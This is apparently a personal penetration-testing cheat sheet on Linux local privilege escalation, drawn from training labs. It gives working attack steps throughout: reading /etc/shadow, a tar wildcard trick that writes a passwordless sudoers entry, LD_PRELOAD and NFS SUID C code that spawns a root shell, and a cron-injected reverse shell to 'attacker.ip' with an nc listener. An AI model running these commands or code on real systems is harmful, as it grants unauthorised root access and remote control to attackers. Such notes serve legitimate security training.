#linux/LPE
# Enumeration
* `hostname`
* `uname -a`
* `cat /proc/version`
* `cat /etc/issue`
* `ps -A`
* `ps axjf` - tree view
* `ps aux` - all processes
* `env`
* `id <username>`
* `cat /etc/passwd` - list of users
* `cat /etc/shadow` - password hashes
	   * Detect hash type in `/etc/shadow` using `grep ENCRYPT_METHOD /etc/login.defs`
* `history`
* `ifconfig`
* `ip route`
* `netstat -a` - all open ports, `netstat -at` or `netstat -au` - tcp/udp, `nestat -l` - listening mode
* `netstat -tp`: list connections with the service name and PID information
* `find / -writable -type d 2>/dev/null` : Find world-writeable folders
* `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
* `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit
* `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` SUID
* `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` SGID
* `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student` - file all hidden files
* `find / -type d -name ".*" -ls 2>/dev/null` - all hidden dirs
* `ls -l /tmp /var/tmp /dev/shm` - tmp files
* Installed packages
```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```
* configs
```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```
* scripts
```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

##### Groups
adm
Members of the adm group are able to read all logs stored in /var/log. 

Disk
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1,


##### Wildcard abuse
tar exampl
```bash
# crontab
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
# abusing
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

##### Restricted shell
https://vk9-sec.com/linux-restricted-shell-bypass/
```bash
ssh htb-user@10.129.205.109 -t "bash --noprofile"
```
##### Automated tools
- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
	* `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
## psspy
Spy on running process to find passed function arguments like passwords
https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
#### Kernel exploits
* https://github.com/The-Z-Labs/linux-exploit-suggester
* https://www.cvedetails.com/
* https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
#### sudo
* run `sudo -l`
* Check binaries at https://gtfobins.github.io/

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
	```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
#### SUID
1. c will list files that have SUID or SGID bits set.
2. Check gtfobins
#### Capabilities
1. `getcap -r / 2>/dev/null`
2. Check gtfobins
#### Cron
1. `cat /etc/crontab`
2. Modify available cron script and add your code there: 
```bash
bash -i >& /dev/tcp/attacker.ip/6666 0>&1   
```
3. Listen on attacker machine: `nc -nlvp 6666`

#### [[NFS]]
List mountable devices `cat /etc/exports`

On attacker machine: 
`showmount -e <ip>`
`mount -o rw <ip>:/backups /tmp/bd`

Create executable with SUID set and run on attacker machine:
```c
int main(){
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
```
## Local ports
Show ports in use:
```bash
ss -tnl

ss -tunlp 
```
Display default service for each port in use:
```bash
ss -tl
```
Discover open ports and services:
```shell
netstat -tulpn | grep LISTEN
```
## Case 1. Bash
```bash
if [[ $DB_PASS == $USER_PASS ]]; then
	/usr/bin/echo "Password confirmed!"
else
	/usr/bin/echo "Password confirmation failed!"
exit 1
fi
```
This is due to the use of == inside [[ ]] in Bash , which performs pattern matching rather than
a direct string comparison; more on this can be found https://mywiki.wooledge.org/BashPitfalls#if_.5B.5B_.24foo_.3D_.24bar_.5D.5D_.28depending_on_intent.29
## Case 2. tar unarchive wildcard
https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com